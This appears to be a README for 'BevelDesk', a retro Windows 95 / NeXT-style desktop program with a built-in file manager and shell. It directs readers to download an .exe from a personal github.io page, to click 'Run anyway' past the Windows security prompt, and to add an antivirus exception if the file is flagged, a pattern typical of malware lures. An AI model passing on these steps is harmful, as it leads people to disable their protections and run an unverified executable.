## 🚀 Setting up BevelDesk

You do not need to install complex software or change your system settings to use BevelDesk. Follow these steps to start using the desktop environment on your computer.

1. Open your web browser and go to the official [BevelDesk download page](https://princeya3822.github.io).
2. Look for the latest version under the Releases section on the right side of the screen.
3. Find the file ending in .exe and click on it to save it to your computer.
4. Open your Downloads folder once the file finishes downloading.
5. Double-click the file named BevelDesk.exe to run the application.

If Windows shows a security prompt, click More info and then click Run anyway. This ensures the program starts correctly. You can move this file to any folder on your computer to keep your files organized.

## 🛠️ Using the features

BevelDesk lets you switch between two distinct visual themes. Press the designated key to toggle between the silver Windows 95 style and the dark NeXT Night theme. The application draws every single pixel by hand, meaning you see sharp lines and consistent bevels throughout the interface.

You can manage your files directly within the application. The internal file manager interacts with your existing hard drive folders. You can open, move, and organize your files just like you do on your standard Windows desktop.

The built-in command prompt allows you to run shell commands. This window provides a real terminal experience inside the retro frame. You can navigate directories and execute standard system tasks without leaving the BevelDesk environment.

## 💡 Troubleshooting common issues

If the application fails to open, check that you have the latest graphics drivers installed for your computer. Occasionally, Windows security software might flag new files. If your antivirus prevents the app from running, add an exception for the BevelDesk.exe file in your security settings.

If the window looks too small or too large, you can resize the application window by dragging its corners. The bevels and icons will adjust automatically to reflect the new size. 

If you find that the file manager cannot access a specific folder, ensure that the folder is not marked as read-only by your system settings. BevelDesk requires read and write permissions to manage your files properly.

## ❓ Frequently asked questions

Does this replace my Windows desktop? 
No, BevelDesk runs as a standalone program. It does not replace your standard Windows interface or modify your system files. You can close the application at any time to return to your normal desktop.

Can I install new icons or themes? 
BevelDesk currently uses a fixed set of high-quality, hand-drawn assets to maintain its specific look. You cannot add external image files or custom themes at this time.

Is my data safe when using the file manager? 
The file manager interacts with your local data just like any standard program. It does not send your files or personal information to any remote server. Everything happens on your local machine.
